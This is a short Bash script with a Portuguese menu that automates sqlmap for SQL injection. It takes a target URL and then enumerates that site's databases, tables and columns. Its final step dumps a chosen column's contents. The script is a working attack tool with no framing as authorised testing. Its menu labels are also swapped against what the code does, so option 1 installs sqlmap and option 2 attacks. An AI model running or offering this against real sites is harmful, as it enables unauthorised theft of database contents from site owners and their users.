#!/bin/bash
# https://github.com/EdSec

echo '''
 :::::::::::::::::::::::::::::::::::::

 [+] Script >sqlmap automatico<

 [+] Coded by: EdSec

 :::::::::::::::::::::::::::::::::::::


 [ 1 ] > USAR SQLMAP AUTOMÁTICO
 [ 2 ] > INSTALAR SQLMAP

 [+] Qual opção você deseja ?'''
read -p " [+]>> " op

if [ "$op" = "1" ]
  then
  git clone https://github.com/sqlmapproject/sqlmap
  echo " [+] Sqlmap instalado com sucesso !"
  sleep 2
fi

if [ "$op" = "2" ]
  then

  cd $HOME
  cd sqlmap

  echo " [+] DIGITE A URL PARA O SQLMAP"
  read -p " [+]>> " url

  python2 sqlmap.py -u $url --risk 2 --level 2 --dbs

  echo " [+] DIGITE O NOME DO BANCO DE DADOS"
  read -p " [+]>> " db

  python2 sqlmap.py -u $url --risk 2 --level 2 -D $db --tables

  echo " [+] DIGITE O NOME DA TABELA"
  read -p " [+]>> " tabela

  python2 sqlmap.py -u $url --risk 2 --level 2 -D $db -T $tabela --columns

  echo " [+] DIGITE O NOME DA COLUNA"
  read -p "[+]>> " coluna

  python2 sqlmap.py -u $url --risk 2 --level 2 -D $db -T $tabela -C $coluna --dump

fi

